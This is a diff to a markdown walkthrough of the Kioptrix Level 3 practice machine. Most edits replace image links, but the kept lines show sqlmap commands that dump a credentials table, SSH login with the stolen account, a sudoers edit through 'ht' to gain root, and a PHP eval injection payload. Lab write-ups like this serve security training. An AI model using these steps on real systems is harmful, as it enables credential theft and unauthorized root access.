@@ -39,6 +39,7 @@ PORT STATE SERVICE VERSION
 |_http-title: Ligoat Security - Got Goat? Security ...
 ```
 
+<img width="1035" height="357" alt="image" src="https://github.com/user-attachments/assets/7e964748-0689-4949-9640-694fdab4db5f" />
 
 
 ---
@@ -47,16 +48,17 @@ PORT STATE SERVICE VERSION
 
 Hitting the port 80 and we found the ligoat web application :
 
-![[Pasted image 20241226231241.png]]
+<img width="1912" height="1046" alt="image" src="https://github.com/user-attachments/assets/80a31aa3-8881-404c-afb2-142b14a13ad9" />
 
 
 Going to the **gallery** section, go to the **Ligoat Press Room**, we have the sorting options here. Set it to photo id and here by giving the **1'** we can generate **mysql** error.
 
-![[Pasted image 20241226231539.png]]
+<img width="1919" height="607" alt="image" src="https://github.com/user-attachments/assets/5a6a40f4-2d25-4308-a506-5e127cf34b27" />
+
 
 ## Generating mysql error
 
-![[Pasted image 20241226231600.png]]
+<img width="1919" height="1050" alt="image" src="https://github.com/user-attachments/assets/ad83f49d-ca03-49ec-b544-2f82c6a4bd34" />
 
 
 ## Sqlmap
@@ -68,7 +70,7 @@ sqlmap -u http://kioptrix3.com/gallery/gallery.php\?id\=1 --dbs -batch
 ```
 
 
-![[Pasted image 20241226231730.png]]
+<img width="863" height="346" alt="image" src="https://github.com/user-attachments/assets/f0ea6c6d-f334-4826-a06b-c6d310ac1931" />
 
 
 ## Finding user credentials through sqlmap :
@@ -77,14 +79,14 @@ sqlmap -u http://kioptrix3.com/gallery/gallery.php\?id\=1 --dbs -batch
 sqlmap -u http://kioptrix3.com/gallery/gallery.php\?id\=1 -T dev_accounts --dump
 ```
 
-![[Pasted image 20241226231942.png]]
+<img width="931" height="183" alt="image" src="https://github.com/user-attachments/assets/07ad345b-a203-4be4-9890-949749f561d3" />
 We found the two username and thier password. Let's try loging in with them through ssh.
 
 ```bash
 ssh -o HostKeyAlgorithms=+ssh-rsa loneferret@192.168.56.101
 ```
 
-![[Pasted image 20241226232055.png]]
+<img width="1372" height="649" alt="image" src="https://github.com/user-attachments/assets/4619f6ed-fcf3-4c9a-bd1c-3f7a576f5542" />
 
 ----
 ## Privelege Escalation
@@ -109,11 +111,11 @@ sudo ht /etc/sudoers
 ```
 
 A similar interface will pop up use **f3** to open the **/etc/sudoers** file. (If there is an error of xterm colour )
-![[Pasted image 20241226234321.png]]
+<img width="1918" height="1048" alt="image" src="https://github.com/user-attachments/assets/da3c8a7d-db04-4708-8331-61b37a5970d8" />
 
 
 Add the line `loneferret ALL=(ALL) ALL` 
-![[Pasted image 20241226234437.png]]
+<img width="1380" height="884" alt="image" src="https://github.com/user-attachments/assets/5ea0f957-f6d1-435b-a77b-78737ee388e9" />
 
 
 Use **f2** to save and **f10** to quit the file.
@@ -121,7 +123,7 @@ Use **f2** to save and **f10** to quit the file.
 Now you can easily use **sudo su** command to switch to the root user.
 
 
-![[Pasted image 20241226234721.png]]
+<img width="1919" height="965" alt="image" src="https://github.com/user-attachments/assets/4a5d1760-aecc-40d6-b89f-4784982b88d9" />
 
 
 ----
@@ -205,7 +207,7 @@ index');eval("system('id');");#
 ```
 
 
-![[Pasted image 20241226222700.png]]
+<img width="1496" height="756" alt="image" src="https://github.com/user-attachments/assets/33373aed-efb4-48fe-b48c-e4d90662230f" />
 
 
 Now we need to just use netcat to get the reverse shell. 
